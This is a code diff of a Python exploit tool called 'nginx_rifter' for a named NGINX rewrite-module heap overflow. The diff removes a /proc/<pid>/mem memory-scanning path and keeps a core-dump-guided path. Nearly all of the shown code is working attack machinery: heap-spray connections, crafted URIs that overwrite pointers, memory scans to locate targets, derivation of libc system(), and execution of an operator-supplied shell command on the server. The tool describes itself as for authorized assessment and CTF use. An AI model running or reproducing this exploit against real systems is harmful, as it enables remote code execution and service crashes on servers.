@@ -19,7 +19,7 @@ from dataclasses import dataclass, field
 from pathlib import PurePosixPath
 
 
-TOOL_VERSION = "v3.0"
+TOOL_VERSION = "v2.1"
 BUG_CVE = "CVE-2026-42945"
 BUG_NAME = "NGINX rewrite-module heap buffer overflow"
 BUG_DETAIL = "rewrite/set args-escaping length/copy mismatch"
@@ -37,8 +37,6 @@ DEFAULT_PID_FILES = (
     "/var/run/nginx.pid",
 )
 DEFAULT_PROBE_CRASH_ADDR = 0x303030303030
-DEFAULT_PROC_MEM_MAX_REGION = 256 * 1024 * 1024
-DEFAULT_MEM_CHUNK_SIZE = 256 * 1024
 BODY_LEN = 4000
 N_SPRAY = 20
 DEFAULT_A_COUNT = 127
@@ -109,13 +107,13 @@ class Reporter:
 
     def banner(self, target, vector):
         self.line()
-        self.line(self.c.bold(self.c.cyan(f"nginx_rifter {TOOL_VERSION} - NGINX Rift coreless assessor/exploit")))
+        self.line(self.c.bold(self.c.cyan(f"nginx_rifter {TOOL_VERSION} - NGINX Rift assessor")))
         self.line(self.c.dim("=" * 78))
         self.line(f"Bug:      {self.c.bold(BUG_CVE)} - {BUG_NAME}")
         self.line(f"Cause:    {BUG_DETAIL}")
         self.line(f"Target:   {self.c.bold(target)}")
         self.line(f"FileRead: {vector}")
-        self.line("Default:  assessment only; pass --exploit --cmd ... for the coreless proc-mem path")
+        self.line("Default:  assessment only; pass --exploit --cmd ... for the crashing exploit path")
         self.line(f"Fixed:    {FIXED_UPSTREAM}")
         self.line(self.c.dim("=" * 78))
         self.line()
@@ -1050,255 +1048,6 @@ def filter_slot_hits_by_cleanup_windows(slot_hits, pools, target_len):
     return matches
 
 
-def close_all(handles):
-    for item in handles:
-        if isinstance(item, list):
-            close_all(item)
-            continue
-        try:
-            item.close()
-        except Exception:
-            pass
-
-
-def send_held_probe(host, port, target_bytes, body, *, a_count, plus_count):
-    sprays = []
-    for _ in range(N_SPRAY):
-        sock = socket.create_connection((host, port), timeout=5)
-        req = (
-            b"POST /spray HTTP/1.1\r\n"
-            b"Host: l\r\n"
-            b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
-            b"X-Delay: 60\r\n"
-            b"Connection: close\r\n"
-            b"\r\n"
-            + body
-        )
-        sock.sendall(req)
-        sprays.append(sock)
-        time.sleep(0.005)
-
-    time.sleep(0.2)
-    trigger = socket.create_connection((host, port), timeout=5)
-    payload = "A" * a_count + "+" * plus_count + target_bytes.decode("latin-1")
-    trigger.sendall((f"GET /api/{payload} HTTP/1.1\r\nHost:localhost\r\n").encode("latin-1"))
-    time.sleep(0.05)
-
-    victim = socket.create_connection((host, port), timeout=5)
-    victim.sendall(H2_PREFACE + make_h2_frame(H2_EXTENSION_FRAME, body))
-    victim.settimeout(0.2)
-    try:
-        victim.recv(128)
-    except (socket.timeout, ConnectionResetError, OSError):
-        pass
-
-    time.sleep(0.05)
-    trigger.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
-    time.sleep(0.2)
-    return sprays, trigger, victim
-
-
-def writable_maps(maps, max_region):
-    for mapping in maps:
-        if not mapping.perms.startswith("rw"):
-            continue
-        size = mapping.end - mapping.start
-        if size <= 0 or size > max_region:
-            continue
-        if "/run/rosetta/" in mapping.path:
-            continue
-        yield mapping
-
-
-def mem_read(target, pid, addr, size):
-    return target.lfi_read(f"/proc/{pid}/mem", offset=addr, length=size, timeout=20)
-
-
-def scan_live_mem_for_slot_markers(
-    target,
-    pid,
-    maps,
-    nonce,
-    marker_offset,
-    stride,
-    target_len,
-    max_hits,
-    max_region,
-    chunk_size,
-):
-    marker_len = 8
-    hits = []
-    seen = set()
-    overlap = marker_offset + marker_len + stride + 16
-    max_slot = BODY_LEN - marker_offset - marker_len
-    for mapping in writable_maps(maps, max_region):
-        pos = 0
-        carry = b""
-        while pos < mapping.end - mapping.start:
-            read_len = min(chunk_size, mapping.end - mapping.start - pos)
-            try:
-                chunk = mem_read(target, pid, mapping.start + pos, read_len)
-            except Exception:
-                break
-            if not chunk:
-                break
-            buf = carry + chunk
-            buf_addr = mapping.start + pos - len(carry)
-            search_from = 0
-            while True:
-                idx = buf.find(nonce, search_from)
-                if idx == -1:
-                    break
-                if idx >= 2:
-                    marker_start = buf_addr + idx - 2
-                    slot_offset = struct.unpack_from("<H", buf, idx - 2)[0]
-                    fake_addr = marker_start - marker_offset
-                    if slot_offset <= max_slot and slot_offset % stride == 0:
-                        key = (fake_addr, slot_offset)
-                        if key not in seen:
-                            seen.add(key)
-                            hits.append(CoreSlotHit(fake_addr, slot_offset))
-                            if len(hits) >= max_hits:
-                                break
-                search_from = idx + 1
-            if len(hits) >= max_hits:
-                break
-            carry = buf[-overlap:]
-            pos += len(chunk)
-        if len(hits) >= max_hits:
-            break
-
-    safe, unsafe = [], []
-    for hit in hits:
-        (safe if addr_low_is_safe(hit.addr, target_len) else unsafe).append(hit)
-    return CoreSlotHits(safe=safe, unsafe=unsafe)
-
-
-def scan_live_mem_for_cleanup_pools(target, pid, maps, max_hits, max_region, chunk_size):
-    hits = []
-    seen = set()
-    writable = [(m.start, m.end) for m in maps if m.perms.startswith("rw")]
-    for mapping in writable_maps(maps, max_region):
-        pos = 0
-        carry = b""
-        while pos < mapping.end - mapping.start:
-            read_len = min(chunk_size, mapping.end - mapping.start - pos)
-            try:
-                chunk = mem_read(target, pid, mapping.start + pos, read_len)
-            except Exception:
-                break
-            if not chunk:
-                break
-            buf = carry + chunk
-            buf_addr = mapping.start + pos - len(carry)
-            idx = ((buf_addr + 7) & ~0x7) - buf_addr
-            while idx + 80 <= len(buf):
-                pool_addr = buf_addr + idx
-                if pool_addr not in seen:
-                    words = struct.unpack_from("<10Q", buf, idx)
-                    if looks_like_pool(words, pool_addr):
-                        cleanup = words[8]
-                        if any(start <= cleanup < end for start, end in writable):
-                            seen.add(pool_addr)
-                            hits.append(CorePoolHit(pool_addr, words[0], words[1], cleanup))
-                            if len(hits) >= max_hits:
-                                return hits
-                idx += 8
-            carry = buf[-96:]
-            pos += len(chunk)
-    return hits
-
-
-def scan_live_mem_for_probe_pools(
-    target,
-    pid,
-    maps,
-    probe_addr,
-    target_len,
-    max_hits,
-    max_region,
-    chunk_size,
-):
-    mask = (1 << (8 * target_len)) - 1
-    probe_low = probe_addr & mask
-    hits = []
-    seen = set()
-    writable = [(m.start, m.end) for m in maps if m.perms.startswith("rw")]
-    for mapping in writable_maps(maps, max_region):
-        pos = 0
-        carry = b""
-        while pos < mapping.end - mapping.start:
-            read_len = min(chunk_size, mapping.end - mapping.start - pos)
-            try:
-                chunk = mem_read(target, pid, mapping.start + pos, read_len)
-            except Exception:
-                break
-            if not chunk:
-                break
-            buf = carry + chunk
-            buf_addr = mapping.start + pos - len(carry)
-            idx = ((buf_addr + 15) & ~0xF) - buf_addr
-            while idx + 80 <= len(buf):
-                pool_addr = buf_addr + idx
-                if pool_addr not in seen:
-                    words = struct.unpack_from("<10Q", buf, idx)
-                    last, end, _next_pool, _failed, max_size, _current, _chain, _large, cleanup, log = words
-                    if (
-                        pool_addr < last <= end
-                        and 0 < end - pool_addr <= 0x40000
-                        and (cleanup & mask) == probe_low
-                        and any(start <= cleanup + 24 <= end for start, end in writable)
-                        and any(start <= log < end for start, end in writable)
-                        and pool_addr - 0x1000000 <= cleanup <= pool_addr + 0x1000000
-                        and max_size <= 0x100000
-                    ):
-                        seen.add(pool_addr)
-                        hits.append(CorePoolHit(pool_addr, last, end, cleanup))
-                        if len(hits) >= max_hits:
-                            return hits
-                idx += 8
-            carry = buf[-96:]
-            pos += len(chunk)
-    return hits
-
-
-def scan_live_mem_for_low_cleanup_words(target, pid, maps, probe_addr, target_len, max_hits, max_region, chunk_size):
-    mask = (1 << (8 * target_len)) - 1
-    probe_low = probe_addr & mask
-    hits = []
-    seen = set()
-    writable = [(m.start, m.end) for m in maps if m.perms.startswith("rw")]
-    for mapping in writable_maps(maps, max_region):
-        pos = 0
-        carry = b""
-        while pos < mapping.end - mapping.start:
-            read_len = min(chunk_size, mapping.end - mapping.start - pos)
-            try:
-                chunk = mem_read(target, pid, mapping.start + pos, read_len)
-            except Exception:
-                break
-            if not chunk:
-                break
-            buf = carry + chunk
-            buf_addr = mapping.start + pos - len(carry)
-            idx = ((buf_addr + 7) & ~0x7) - buf_addr
-            while idx + 8 <= len(buf):
-                addr = buf_addr + idx
-                value = struct.unpack_from("<Q", buf, idx)[0]
-                if (value & mask) == probe_low and value and addr not in seen:
-                    mapped = any(start <= value < end for start, end in writable)
-                    near = addr - 0x1000000 <= value <= addr + 0x1000000
-                    if mapped or near:
-                        hits.append((addr, value, mapped, near))
-                        seen.add(addr)
-                        if len(hits) >= max_hits:
-                            return hits
-                idx += 8
-            carry = buf[-16:]
-            pos += len(chunk)
-    return hits
-
-
 def proof_seen(target, marker_path, token):
     try:
         return token.encode("ascii") in target.lfi_read(marker_path, timeout=2)
@@ -1686,29 +1435,6 @@ def collect_os_info(target, file_profile, args):
     }
 
 
-def probe_worker_mem_read(target, worker, timeout):
-    if not worker.get("ok"):
-        return {"ok": False, "reason": "worker maps were not discovered"}
-    try:
-        worker_pid = int(worker["worker_pid"])
-        nginx_rw_base = parse_addr(worker.get("nginx_rw_base", "0"))
-        data = target.lfi_read(
-            f"/proc/{worker_pid}/mem",
-            offset=nginx_rw_base,
-            length=16,
-            timeout=max(timeout, 10),
-        )
-        return {
-            "ok": len(data) == 16,
-            "worker_pid": worker_pid,
-            "offset": f"{nginx_rw_base:#x}",
-            "bytes_read": len(data),
-            "sample": data.hex(),
-        }
-    except Exception as exc:
-        return {"ok": False, "reason": short_error(exc)}
-
-
 def evaluate_viability(http_info, file_profile, worker, config, binaries, os_info, args):
     checks = []
 
@@ -1725,17 +1451,15 @@ def evaluate_viability(http_info, file_profile, worker, config, binaries, os_inf
     add("nginx config candidate", bool(config.get("vulnerable_candidates")), f"{len(config.get('vulnerable_candidates', []))} candidate(s)")
     add("nginx binary fingerprint", bool((binaries.get("nginx") or {}).get("build_id")), (binaries.get("nginx") or {}).get("build_id", ""))
     add("libc fingerprint", bool((binaries.get("libc") or {}).get("build_id")), (binaries.get("libc") or {}).get("build_id", ""))
-    proc_mem_probe = probe_worker_mem_read(args.target_obj, worker, args.timeout)
-    add("/proc/<worker>/mem readable", proc_mem_probe.get("ok") is True, proc_mem_probe)
 
     core_pattern = os_info.get("core_pattern", "")
     suid_dumpable = os_info.get("suid_dumpable", "")
     core_settings = core_pattern == "core" and suid_dumpable == "2"
-    add("legacy core settings compatible", core_settings, f"core_pattern={core_pattern!r}, suid_dumpable={suid_dumpable!r}")
+    add("core settings compatible", core_settings, f"core_pattern={core_pattern!r}, suid_dumpable={suid_dumpable!r}")
     existing_core = try_read(args.target_obj, args.core_path, args.timeout, offset=0, length=4)
-    add("legacy pre-existing core readable", existing_core.ok and existing_core.sample.startswith("\x7fELF"), existing_core.error or f"{existing_core.bytes_read} bytes")
+    add("pre-existing core readable", existing_core.ok and existing_core.sample.startswith("\x7fELF"), existing_core.error or f"{existing_core.bytes_read} bytes")
 
-    common_required = {
+    required = {
         item["name"]: item["ok"]
         for item in checks
         if item["name"]
@@ -1747,35 +1471,20 @@ def evaluate_viability(http_info, file_profile, worker, config, binaries, os_inf
             "binary file reads",
             "same-UID nginx worker maps",
             "libc/system derivation",
+            "core settings compatible",
         }
     }
-    coreless_required = dict(common_required)
-    coreless_required["/proc/<worker>/mem readable"] = proc_mem_probe.get("ok") is True
-    legacy_required = dict(common_required)
-    legacy_required["legacy core settings compatible"] = core_settings
-
-    coreless_missing = [name for name, ok in coreless_required.items() if not ok]
-    legacy_missing = [name for name, ok in legacy_required.items() if not ok]
-    if not coreless_missing:
-        verdict = "ready-coreless-proc-mem"
-        reason = "required primitives for the default coreless /proc/<worker>/mem chain are present"
-    elif not legacy_missing:
-        verdict = "ready-legacy-core-guided"
-        reason = "coreless proc-mem is unavailable, but legacy readable-core prerequisites appear present"
-    else:
+    missing = [name for name, ok in required.items() if not ok]
+    if missing:
         verdict = "partial"
-        reason = "missing for coreless path: " + ", ".join(coreless_missing)
+        reason = "missing: " + ", ".join(missing)
+    else:
+        verdict = "ready-with-lab-like-core-leak"
+        reason = "required primitives for the current core-guided chain are present"
     if not config.get("vulnerable_candidates"):
         reason += "; vulnerable rewrite/set route was not confirmed from readable config"
 
-    return {
-        "verdict": verdict,
-        "reason": reason,
-        "checks": checks,
-        "proc_mem_probe": proc_mem_probe,
-        "coreless_missing": coreless_missing,
-        "legacy_core_missing": legacy_missing,
-    }
+    return {"verdict": verdict, "reason": reason, "checks": checks}
 
 
 def print_assessment(report, assessment):
@@ -1800,8 +1509,8 @@ def print_assessment(report, assessment):
     report.kv("OS", os_info.get("pretty_name") or "not learned")
     report.kv("kernel", os_info.get("kernel_release") or "not learned")
     report.kv("ASLR", os_info.get("aslr") or "not learned", "ok" if os_info.get("aslr") == "2" else "warn")
-    report.kv("core_pattern (legacy)", os_info.get("core_pattern") or "not learned", "ok" if os_info.get("core_pattern") == "core" else "warn")
-    report.kv("suid_dumpable (legacy)", os_info.get("suid_dumpable") or "not learned", "ok" if os_info.get("suid_dumpable") == "2" else "warn")
+    report.kv("core_pattern", os_info.get("core_pattern") or "not learned", "ok" if os_info.get("core_pattern") == "core" else "warn")
+    report.kv("suid_dumpable", os_info.get("suid_dumpable") or "not learned", "ok" if os_info.get("suid_dumpable") == "2" else "warn")
     worker = assessment.worker
     report.kv("worker maps", "readable" if worker.get("ok") else "not confirmed", "ok" if worker.get("ok") else "bad")
     if worker.get("ok"):
@@ -1840,7 +1549,7 @@ def print_assessment(report, assessment):
     for check in viability.get("checks", []):
         status = "ok" if check["ok"] else "warn"
         report.kv(check["name"], check["detail"], status)
-    verdict_status = "ok" if str(viability.get("verdict", "")).startswith("ready-") else "warn"
+    verdict_status = "ok" if viability.get("verdict") == "ready-with-lab-like-core-leak" else "warn"
     report.kv("verdict", viability.get("verdict"), verdict_status)
     report.kv("reason", viability.get("reason"), verdict_status)
 
@@ -1858,7 +1567,7 @@ def build_capture_command(args, marker_path, token):
     cleanup = ""
     if args.cleanup_delay > 0:
         cleanup_paths = [marker_path]
-        if getattr(args, "cleanup_core", False) and getattr(args, "exploit_method", "proc-mem") == "core":
+        if args.cleanup_core:
             cleanup_paths.append(args.core_path)
         rm_args = " ".join(shlex.quote(path) for path in cleanup_paths)
         cleanup = f"; (sleep {int(args.cleanup_delay)}; rm -f {rm_args}) >/dev/null 2>&1 &"
@@ -1913,10 +1622,6 @@ def geometry_candidates(args):
     return ordered[: args.max_calibration_probes]
 
 
-def final_candidate_limit(args):
-    return getattr(args, "max_final_candidates", getattr(args, "max_core_hits", 100))
-
-
 def derive_target_facts(report, target, args):
     report.info("discovering nginx worker and deriving system() from remote libc")
     facts, php_uid, master_pid = find_worker(target, args.max_pid, args.pid_file)
@@ -1929,10 +1634,6 @@ def derive_target_facts(report, target, args):
     report.kv("system() offset", f"{system_offset:#x}")
     report.kv("system()", f"{system_addr:#x}", "ok")
     return facts, php_uid, master_pid, system_offset, system_addr
-
-
-def load_worker_maps(target, worker_pid):
-    return parse_maps(target.lfi_text(f"/proc/{worker_pid}/maps", timeout=5))
 
 
 def collect_core_candidates(report, target, args, geometry, expected_worker_pid):
@@ -1990,13 +1691,12 @@ def collect_core_candidates(report, target, args, geometry, expected_worker_pid)
 
 def try_final_candidates(report, target, args, matches, system_addr, marker_path, token, cmd, geometry):
     a_count, plus_count = geometry
-    limit = final_candidate_limit(args)
-    for index, match in enumerate(matches[:limit], start=1):
+    for index, match in enumerate(matches[: args.max_core_hits], start=1):
         hit = match.hit
         if not wait_alive(args.host, args.port, timeout=20):
             raise RuntimeError("nginx did not recover before final attempt")
         report.info(
-            f"trying candidate {index}/{min(len(matches), limit)} "
+            f"trying candidate {index}/{min(len(matches), args.max_core_hits)} "
             f"at {hit.addr:#x}, body offset {hit.slot_offset}"
         )
         body = make_body_at_offset(cmd, hit.addr, system_addr, hit.slot_offset)
@@ -2019,219 +1719,12 @@ def try_final_candidates(report, target, args, matches, system_addr, marker_path
     return None
 
 
-def collect_proc_mem_candidates(report, target, args, geometry, facts, maps):
-    a_count, plus_count = geometry
-    probe_addr = args.probe_crash_addr
-    if not addr_low_is_safe(probe_addr, args.target_len):
-        raise RuntimeError(f"probe crash address is not URI-safe: {probe_addr:#x}")
-
-    sample = mem_read(target, facts.worker_pid, facts.nginx_rw_base, 16)
-    report.kv("/proc worker mem sample", sample.hex(), "ok" if len(sample) == 16 else "warn")
-
-    nonce = secrets.token_bytes(6)
-    probe_body = make_slot_probe_body(nonce, args.slot_marker_offset, args.slot_stride)
-    probe_low = low_bytes(probe_addr, args.target_len)
-    report.kv("geometry", f"A={a_count}, plus={plus_count}")
-    report.kv("slot nonce", nonce.hex())
-    report.kv("probe target low bytes", probe_low.hex())
-
-    handles = send_held_probe(
-        args.host,
-        args.port,
-        probe_low,
-        probe_body,
-        a_count=a_count,
-        plus_count=plus_count,
-    )
-    try:
-        slot_hits = scan_live_mem_for_slot_markers(
-            target,
-            facts.worker_pid,
-            maps,
-            nonce,
-            args.slot_marker_offset,
-            args.slot_stride,
-            args.target_len,
-            args.max_slot_hits,
-            args.max_region,
-            args.chunk_size,
-        )
-        cleanup_pools = scan_live_mem_for_cleanup_pools(
-            target,
-            facts.worker_pid,
-            maps,
-            args.max_cleanup_pools,
-            args.max_region,
-            args.chunk_size,
-        )
-        probe_pools = scan_live_mem_for_probe_pools(
-            target,
-            facts.worker_pid,
-            maps,
-            probe_addr,
-            args.target_len,
-            args.max_cleanup_pools,
-            args.max_region,
-            args.chunk_size,
-        )
-        mask = (1 << (8 * args.target_len)) - 1
-        overwritten = [pool for pool in cleanup_pools if (pool.cleanup & mask) == (probe_addr & mask)]
-        window_pools = overwritten or probe_pools or cleanup_pools
-        matches = filter_slot_hits_by_cleanup_windows(slot_hits.safe, window_pools, args.target_len)
-        total_slots = len(slot_hits.safe) + len(slot_hits.unsafe)
-        report.kv("live mem slots", f"{len(slot_hits.safe)} URI-safe / {total_slots} total")
-        report.kv("cleanup pools", len(cleanup_pools))
-        report.kv("probe/corrupt pools", len(probe_pools))
-        report.kv("overwritten pools", len(overwritten))
-        report.kv("matched candidates", len(matches), "ok" if matches else "warn")
-
-        if not probe_pools and report.verbose:
-            low_words = scan_live_mem_for_low_cleanup_words(
-                target,
-                facts.worker_pid,
-                maps,
-                probe_addr,
-                args.target_len,
-                30,
-                args.max_region,
-                args.chunk_size,
-            )
-            report.kv("low-byte diagnostic words", len(low_words))
-            for addr, value, mapped, near in low_words[:10]:
-                report.info(f"word@{addr:#x}={value:#x} mapped={mapped} near={near}")
-            if low_words and not matches:
-                synthetic_pools = [
-                    CorePoolHit(addr, 0, 0, value)
-                    for addr, value, _mapped, _near in low_words
-                ]
-                matches = filter_slot_hits_by_cleanup_windows(
-                    slot_hits.safe, synthetic_pools, args.target_len
-                )
-                report.kv("synthetic low-word matches", len(matches), "ok" if matches else "warn")
-    finally:
-        report.info("closing held probe sockets to let nginx reset before final attempts")
-        close_all(handles)
-
-    if not matches:
-        report.warn("cleanup-window filter produced no matches; falling back to safe live slot candidates")
-        matches = [
-            CoreSlotMatch(hit=hit, pool=CorePoolHit(0, 0, 0, 0))
-            for hit in slot_hits.safe
-        ]
-        report.kv("fallback candidates", len(matches), "ok" if matches else "bad")
-    return matches, probe_body
-
-
-def run_proc_mem_exploit(args, report):
+def run_integrated_exploit(args, report):
     if not args.cmd:
         raise RuntimeError("--exploit requires --cmd")
     target = args.target_obj
     report.step("Integrated Exploit Path")
-    report.kv("mode", "coreless /proc/<nginx-worker>/mem")
-    report.kv("command", args.cmd, "ok")
-    if not wait_alive(args.host, args.port, timeout=20):
-        raise RuntimeError(f"nginx is not responding on {args.host}:{args.port}")
-
-    facts, _php_uid, _master_pid, _system_offset, system_addr = derive_target_facts(report, target, args)
-    maps = load_worker_maps(target, facts.worker_pid)
-    report.kv("worker maps", len(maps), "ok")
-    sample = mem_read(target, facts.worker_pid, facts.nginx_rw_base, 16)
-    report.kv("/proc worker mem", f"read {len(sample)} bytes at {facts.nginx_rw_base:#x}", "ok" if len(sample) == 16 else "warn")
-    if args.derive_only:
-        report.kv("derive-only", "stopping before spray/probe", "warn")
-        args.last_exploit_result = {
-            "status": "derive-only",
-            "method": "proc-mem",
-            "worker_pid": facts.worker_pid,
-            "nginx_rw_base": f"{facts.nginx_rw_base:#x}",
-            "libc_base": f"{facts.libc_base:#x}",
-            "system_addr": f"{system_addr:#x}",
-            "proc_mem_sample": sample.hex(),
-        }
-        return 0
-
-    marker_path = args.marker or f"/tmp/nginx_rifter_{secrets.token_hex(6)}"
-    token = args.token or secrets.token_hex(16)
-    cmd = build_capture_command(args, marker_path, token)
-    report.step("Proof Setup")
-    report.kv("marker path", marker_path)
-    report.kv("overwrite", f"{args.target_len} low byte(s), live proc-mem candidates")
-    report.kv("max memory region", args.max_region)
-    report.kv("max final candidates", final_candidate_limit(args))
-
-    for round_index in range(1, args.exploit_rounds + 1):
-        report.step(f"Exploit Round {round_index}/{args.exploit_rounds}")
-        for geometry in geometry_candidates(args):
-            try:
-                facts, _php_uid, _master_pid, _system_offset, _system_addr = derive_target_facts(
-                    report, target, args
-                )
-                maps = load_worker_maps(target, facts.worker_pid)
-                matches, _probe_body = collect_proc_mem_candidates(
-                    report, target, args, geometry, facts, maps
-                )
-            except Exception as exc:
-                report.warn(f"geometry A={geometry[0]}, plus={geometry[1]} failed: {short_error(exc)}")
-                continue
-            if not matches:
-                continue
-            if args.diagnose_only:
-                report.kv("diagnose-only", "stopping before final candidates", "warn")
-                args.last_exploit_result = {
-                    "status": "diagnose-only",
-                    "method": "proc-mem",
-                    "candidate_count": len(matches),
-                }
-                return 0
-
-            report.step("Fresh Worker Derivation")
-            if not wait_alive(args.host, args.port, timeout=20):
-                raise RuntimeError("nginx did not recover after proc-mem probe")
-            facts, _php_uid, _master_pid, _system_offset, system_addr = derive_target_facts(
-                report, target, args
-            )
-
-            report.step("Final Candidates")
-            win = try_final_candidates(
-                report,
-                target,
-                args,
-                matches,
-                system_addr,
-                marker_path,
-                token,
-                cmd,
-                geometry,
-            )
-            if win:
-                marker_text = read_marker_text(target, marker_path, timeout=3)
-                output = marker_output_without_metadata(marker_text, token)
-                args.last_exploit_result = {
-                    "status": "success",
-                    "method": "proc-mem",
-                    "marker_path": marker_path,
-                    "token": token,
-                    "winner": win,
-                    "command_output": output,
-                }
-                report.step("Result")
-                report.ok("CTF WIN: marker token was read back through the file-read primitive")
-                render_command_output_last(report, args, output)
-                return 0
-        if round_index < args.exploit_rounds:
-            time.sleep(args.round_backoff)
-
-    args.last_exploit_result = {"status": "failed", "method": "proc-mem", "marker_path": marker_path, "token": token}
-    report.fail("exhausted proc-mem candidates without marker proof")
-    return 1
-
-
-def run_core_guided_exploit(args, report):
-    if not args.cmd:
-        raise RuntimeError("--exploit requires --cmd")
-    target = args.target_obj
-    report.step("Integrated Exploit Path")
-    report.kv("mode", "legacy core-guided")
+    report.kv("mode", "self-contained nginx_rifter.py")
     report.kv("command", args.cmd, "ok")
     if not wait_alive(args.host, args.port, timeout=20):
         raise RuntimeError(f"nginx is not responding on {args.host}:{args.port}")
@@ -2320,13 +1813,6 @@ def run_core_guided_exploit(args, report):
     return 1
 
 
-def run_integrated_exploit(args, report):
-    if args.exploit_method == "core":
-        report.warn("legacy core-guided mode selected; nginx_rifter_core_v2_1.py preserves this path")
-        return run_core_guided_exploit(args, report)
-    return run_proc_mem_exploit(args, report)
-
-
 def assess(args):
     headers = parse_headers(args.header)
     if args.host_header:
@@ -2400,7 +1886,7 @@ def parse_args():
         usage="%(prog)s --target HOST:PORT [--file-read-template TEMPLATE] [options]",
         description=(
             "Assessment-first NGINX Rift tool for authorized targets where an HTTP-accessible "
-            "local-file-read primitive can reach same-UID nginx worker procfs data."
+            "local-file-read primitive is available."
         ),
     )
     parser.add_argument("--advanced-help", action="store_true", help="show low-level exploit tuning options")
@@ -2426,19 +1912,17 @@ def parse_args():
     assess_group.add_argument("--max-pid", type=int, default=4096, help="PID scan ceiling")
     assess_group.add_argument("--config-path", action="append", default=[], help="additional nginx config path to try")
     assess_group.add_argument("--max-config-files", type=int, default=16, help="maximum config/include files to read")
-    assess_group.add_argument("--core-path", default="/app/tmp/core", help="legacy core path to test if already present")
+    assess_group.add_argument("--core-path", default="/app/tmp/core", help="core path to test if already present")
     assess_group.add_argument("--fingerprint-max-bytes", type=int, default=32 * 1024 * 1024)
     assess_group.add_argument("--version-scan-bytes", type=int, default=8 * 1024 * 1024)
     assess_group.add_argument("--timeout", type=float, default=5)
 
     exploit = parser.add_argument_group("explicit exploit")
-    exploit.add_argument("--exploit", action="store_true", help="after assessment, run the integrated coreless proc-mem exploit path")
+    exploit.add_argument("--exploit", action="store_true", help="after assessment, run the integrated exploit path")
     exploit.add_argument("--cmd", help="command for --exploit")
-    exploit.add_argument("--exploit-method", choices=("proc-mem", "core"), default="proc-mem", help="exploit disclosure method; core is legacy")
     exploit.add_argument("--exploit-rounds", type=int, default=2)
-    exploit.add_argument("--derive-only", action="store_true", help="derive worker/libc/proc-mem facts, then stop before spray/probe")
-    exploit.add_argument("--diagnose-only", action="store_true", help=advanced("recover proc-mem candidates, then stop before final attempts"))
-    exploit.add_argument("--target-len", type=int, default=6, help=advanced("low pointer bytes to overwrite"))
+    exploit.add_argument("--derive-only", action="store_true", help="derive worker/libc facts, then stop before crash probes")
+    exploit.add_argument("--target-len", type=int, default=2, help=advanced("low pointer bytes to overwrite"))
     exploit.add_argument("--a-count", type=int, default=DEFAULT_A_COUNT, help=advanced("rewrite payload A-count"))
     exploit.add_argument("--plus-count", type=int, default=DEFAULT_PLUS_COUNT, help=advanced("rewrite payload plus-count"))
     exploit.add_argument("--auto-calibrate", dest="auto_calibrate", action="store_true", help=advanced("try nearby geometry values"))
@@ -2449,13 +1933,9 @@ def parse_args():
     exploit.add_argument("--round-backoff", type=float, default=1.0, help=advanced("seconds between rounds"))
     exploit.add_argument("--core-delay", type=float, default=2.0, help=advanced("seconds to wait after core-producing crashes"))
     exploit.add_argument("--proof-delay", type=float, default=0.35, help=advanced("seconds to wait before proof check"))
-    exploit.add_argument("--max-final-candidates", type=int, default=100, help=advanced("maximum final candidates"))
-    exploit.add_argument("--max-core-hits", dest="max_final_candidates", type=int, default=argparse.SUPPRESS, help=advanced("legacy alias for --max-final-candidates"))
-    exploit.add_argument("--max-slot-hits", type=int, default=20000, help=advanced("maximum slot hits from proc-mem or core"))
-    exploit.add_argument("--max-pools", dest="max_cleanup_pools", type=int, default=5000, help=advanced("maximum cleanup pools from proc-mem"))
-    exploit.add_argument("--max-cleanup-pools", dest="max_cleanup_pools", type=int, default=argparse.SUPPRESS, help=advanced("legacy alias for --max-pools"))
-    exploit.add_argument("--max-region", type=int, default=DEFAULT_PROC_MEM_MAX_REGION, help=advanced("maximum writable mapping size to scan through /proc/<pid>/mem"))
-    exploit.add_argument("--chunk-size", type=int, default=DEFAULT_MEM_CHUNK_SIZE, help=advanced("proc-mem read chunk size"))
+    exploit.add_argument("--max-core-hits", type=int, default=100, help=advanced("maximum final candidates"))
+    exploit.add_argument("--max-slot-hits", type=int, default=20000, help=advanced("maximum slot hits from core"))
+    exploit.add_argument("--max-cleanup-pools", type=int, default=5000, help=advanced("maximum cleanup pools from core"))
     exploit.add_argument("--slot-marker-offset", type=int, default=24, help=advanced("slot marker offset in spray body"))
     exploit.add_argument("--slot-stride", type=int, default=8, help=advanced("slot marker stride"))
     exploit.add_argument("--probe-crash-addr", type=parse_addr, default=DEFAULT_PROBE_CRASH_ADDR, help=advanced("URI-safe probe crash address"))
@@ -2486,12 +1966,6 @@ def parse_args():
         parser.error("--file-read-template must include a path placeholder such as {path_url}")
     if args.exploit and not args.cmd:
         parser.error("--exploit requires --cmd")
-    target_len_was_explicit = any(
-        item == "--target-len" or item.startswith("--target-len=")
-        for item in sys.argv[1:]
-    )
-    if args.exploit_method == "core" and not target_len_was_explicit:
-        args.target_len = 2
     if args.max_config_files < 1:
         parser.error("--max-config-files must be positive")
     if args.target_len < 1 or args.target_len > 6:
@@ -2504,12 +1978,6 @@ def parse_args():
         parser.error("--exploit-rounds must be positive")
     if args.max_calibration_probes < 1:
         parser.error("--max-calibration-probes must be positive")
-    if args.max_final_candidates < 1:
-        parser.error("--max-final-candidates must be positive")
-    if args.max_cleanup_pools < 1:
-        parser.error("--max-pools must be positive")
-    if args.max_region < 1 or args.chunk_size < 1:
-        parser.error("--max-region and --chunk-size must be positive")
     if args.command_output_max_lines < 1 or args.command_output_max_chars < 1:
         parser.error("command output limits must be positive")
     return args
